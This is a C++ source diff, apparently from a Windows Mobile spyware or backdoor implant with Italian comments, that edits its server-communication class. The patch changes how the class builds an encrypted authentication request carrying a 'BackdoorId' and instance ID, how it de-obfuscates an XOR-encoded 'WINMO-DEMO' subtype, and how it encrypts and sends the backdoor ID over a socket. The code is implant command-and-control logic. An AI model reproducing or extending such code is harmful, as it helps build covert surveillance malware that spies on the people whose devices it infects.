@@ -1118,7 +1118,9 @@ BOOL Transfer::RestPostRequest(BYTE *pContent, UINT uContentLen, BYTE* &pRespons
 		BYTE *cookie = NULL;
 
 		if (HttpQueryInfo(hResourceHandle, HTTP_QUERY_SET_COOKIE, cookie, (DWORD *)&uCounter, &dwRead) == FALSE) {
-			if (GetLastError() == ERROR_INSUFFICIENT_BUFFER) {
+			DWORD lastErr = GetLastError();
+
+			if (lastErr == ERROR_INSUFFICIENT_BUFFER) {
 				uCounter += 2;
 
 				cookie = new(std::nothrow) BYTE[uCounter];
@@ -1299,7 +1301,7 @@ BOOL Transfer::RestDecryptK(BYTE *pContent) {
 }
 
 BYTE* Transfer::RestCreateAuthRequest(UINT *uEncContentLen) {
-	// Kd (16), Nonce (16), BackdoorId (16), InstanceId (20), Subtype (16), sha1 (20)
+	// Kd (16), Nonce (16), BackdoorId (14), InstanceId (20), Subtype (16), sha1 (20)
 	UINT uContentLen = Encryption::GetPKCS5Len(16 + 16 + 16 + 20 + 16 + 20);
 	UINT uPadding = Encryption::GetPKCS5Padding(16 + 16 + 16 + 20 + 16 + 20);
 
@@ -1335,8 +1337,8 @@ BYTE* Transfer::RestCreateAuthRequest(UINT *uEncContentLen) {
 	if (Task::getDemo()) {
 		int k, i;
 
-		// WINMOBILE-DEMO\x00\x00 ^ Q (Q e' progressivo)
-		BYTE subtype[] = { 0x06, 0x1b, 0x1d, 0x19, 0x1a, 0x14, 0x1e, 0x14, 0x1c, 0x77, 0x1f, 0x19, 0x10, 0x11, 0x5f, 0x60 };
+		// WINMO-DEMO\x00\x00\x00\x00\x00\x00 ^ Q (Q e' progressivo)
+		BYTE subtype[] = { 0x06, 0x1b, 0x1d, 0x19, 0x1a, 0x7b, 0x13, 0x1d, 0x14, 0x15, 0x5b, 0x5c, 0x5d, 0x5e, 0x5f, 0x60 };
 
 		for (i = 0, k = 'Q'; i < 16; i++, k++) {
 			subtype[i] ^= k;
@@ -2843,7 +2845,8 @@ BOOL Transfer::SendIds(SOCKET s) {
 		return FALSE;
 	}
 
-	// Cifriamo il g_BackdoorID (16 byte)
+	// Cifriamo il g_BackdoorID (14 byte)
+	uLen = 16;
 	pData = pEnc->EncryptData(g_BackdoorID, &uLen);
 
 	if (pData == NULL) {
